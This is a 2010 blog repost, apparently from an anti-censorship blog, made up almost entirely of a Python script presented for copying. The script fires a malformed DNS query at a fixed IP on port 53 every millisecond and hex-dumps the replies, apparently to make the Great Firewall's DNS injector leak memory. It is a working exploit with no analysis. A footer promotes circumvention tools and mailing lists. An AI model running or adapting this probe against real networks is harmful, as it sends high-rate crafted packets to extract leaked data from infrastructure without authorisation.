---
layout: post
title:  "重新贴一下GFW溢出的Python代码"
date:   2010-10-17 19:48:02
author: GFW BLOG 功夫网
categories: program
---

## 重新贴一下GFW溢出的Python代码
### by GFW BLOG 功夫网
### at 2010-10-17 19:48:02
### original <http://feedproxy.google.com/~r/chinagfwblog/~3/abjLeaZXC64/gfwpython.html>

<font size="2">来源：<a href="https://1984bbs.org/viewthread.php?tid=758&amp;extra=page%3D1">https://1984bbs.org/viewthread.php?tid=758&amp;extra=page%3D1</a><br></font><h2><font size="2">重新贴一下GFW溢出的Python代码</font></h2> 						 						 																											<div><div><font size="2"><em>复制内容到剪贴板</em></font><h5><font size="2">代码:</font></h5><font size="2"><code>import socket<br>  import binascii<br> import time<br> import threading<br> <br> class DataReceiver:<br>         def __init__(self, s):<br>                 self.s = s<br>         def __call__(self):<br>                 while True:<br>                         r = s.recvfrom(65535)[0]<br>                         i = 0<br>                         while i &lt; len(r):<br>                                 print &#39;%04x:&#39; % i,<br>                                 p = list(r[i : i + 16])<br>                                 for j in range(0, len(p)):<br>                                         print binascii.b2a_hex(p[j]),<br>                                         if p[j] &lt; &#39; &#39; or p[j] &gt; &#39;~&#39;:<br>                                                 p[j] = &#39;.&#39;<br>                                 print &#39; &#39; * ((15 - j) * 3),<br>                                 print &quot;&quot;.join(p)<br>                                 i += 16<br> <br> s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br> threading.Thread(target = DataReceiver(s)).start()<br> while True:<br>         s.sendto(&quot;\0\0\1\0\0\1\0\0\0\0\0\0\<a href="http://6wux.ru">6wux.ru</a>\377&quot;, (&quot;98.137.149.56&quot;, 53))<br>         time.sleep(0.001)</code></font></div></div><font size="2"><br></font> <div>发一封标题为GFW的邮件到fanqiang70ma@gmail.com，就可获取翻墙利器赛风新地址。附《数字时代》赠阅版。被墙网站收集：http://delicious.com/GFWbookmark，请使用GFWlist为标签，帮助我们收集被墙网站的信息。敬请订阅GFW Blog：http://feeds2.feedburner.com/chinagfwblog，邮件订阅：https://groups.google.com/group/gfw-blog。更多翻墙工具介绍和下载：
推客浏览器（http://twitbrowser.net/blog/，墙内镜像：http://tm005.nl.am/)，Sesawe（http://www.sesawwe.net/）。翻墙互助小组邮件列表: http://groups.google.com/group/bypassgfw。<img width="1" height="1" src="https://blogger.googleusercontent.com/tracker/5500297126185736776-7969870153915712053?l=www.chinagfw.org" alt=""></div><img src="http://feeds.feedburner.com/~r/chinagfwblog/~4/abjLeaZXC64" height="1" width="1">